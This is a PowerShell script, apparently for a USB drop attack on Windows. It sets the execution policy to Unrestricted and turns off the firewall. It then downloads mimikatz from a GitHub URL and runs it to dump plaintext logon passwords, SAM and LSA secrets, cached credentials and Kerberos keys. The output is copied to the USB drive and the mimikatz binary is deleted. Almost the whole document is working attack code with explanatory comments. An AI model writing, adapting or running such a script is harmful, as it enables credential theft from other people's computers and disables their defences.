# Check and change execution policy if needed (Run PowerShell as Administrator) (1st) 
#Set-ExecutionPolicy Unrestricted  

#Start-Sleep -Seconds 5
#Set-MpPreference -DisableRealtimeMonitoring $true

# Check current execution policy (2nd) 
$policy = Get-ExecutionPolicy -Scope CurrentUser

# If the current execution policy is more restrictive than "Unrestricted," change it (2nd) 
if ($policy -ne 'Unrestricted') {
    Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
}

# Disable Windows Defender Real-Time Monitoring
netsh advfirewall set allprofiles state off

# Note: The above command is for disabling the Windows Firewall. If you want to disable Windows Defender Real-Time Monitoring, you don't need the "import-module defender" line and the Start-Sleep line.
#Import-Module Defender
# Disable Windows Defender Real-Time Monitoring
#Set-MpPreference -DisableRealtimeMonitoring $true

# Wait for a few seconds (4 seconds in this case) before closing the elevated PowerShell session
Start-Sleep -Seconds 4

# Set TLS 1.2 as the default security protocol
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

#download mimikatz from github 
$webClient = New-Object System.Net.WebClient
$downloadUrl = 'https://raw.githubusercontent.com/ParrotSec/mimikatz/master/x64/mimikatz.exe'
$mimikatzExePath = Join-Path $env:TEMP 'mimikatz.exe'
$webClient.DownloadFile($downloadUrl, $mimikatzExePath)

Start-Sleep -Seconds 4

# Save the Mimikatz output to a text file
$outputFilePath = Join-Path $env:TEMP 'Mimikatz_Output.txt'

cd $env:TEMP

# save the output into a text file 
Start-Process -FilePath $mimikatzExePath -ArgumentList '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"' -RedirectStandardOutput $outputFilePath -Wait

<#privilege::debug: This command enables debugging privileges
token::elevate: This command attempts to elevate the current user's privileges
sekurlsa::logonpasswords: This command is used to extract plaintext passwords from the memory of currently logged-on users.
lsadump::lsa /inject: This command is used to extract LSA secrets from the system's memory. LSA (Local Security Authority) secrets are used to store sensitive data, such as password hashes.
lsadump::sam: This command is used to extract the Security Accounts Manager (SAM) database, which contains user account information and password hashes.
lsadump::cache: This command is used to extract cached logon credentials from memory.
sekurlsa::ekeys: This command is used to extract Kerberos tickets and encryption keys from memory.
exit: This command instructs Mimikatz to exit.#>

# Get the full path to the script directory on the USB drive
$scriptDirectoryOnUsb = $PSScriptRoot

# Define the filename of the output file
$filename = "Mimikatz_Output.txt"

# Construct the full path of the output file in the temporary directory
$outputFilePath2 = Join-Path -Path $env:TEMP -ChildPath $filename

# Construct the full path of the destination on the USB drive
$destinationPath = Join-Path -Path $scriptDirectoryOnUsb -ChildPath $filename

# Move the output file to the USB drive location
Move-Item -Path $outputFilePath2 -Destination $destinationPath


# Set the output file as hidden using .NET methods
#$fileAttributes = [System.IO.FileAttributes]::Hidden
#[System.IO.File]::SetAttributes($outputFileInDownloads, $fileAttributes)

# Display a message indicating the completion of the process (to show file was been moved) 
Write-Host "Mimikatz output has been saved to: $destinationPath"

# Delete the mimikatz.exe from the temporary folder
Remove-Item -Path $mimikatzExePath -Force

# Wait for a few seconds before closing the PowerShell session (optional)
Start-Sleep -Seconds 4

# Stop any running background jobs
Get-Job | Stop-Job

# Close the PowerShell session (idk why but is not closing >:( )
Exit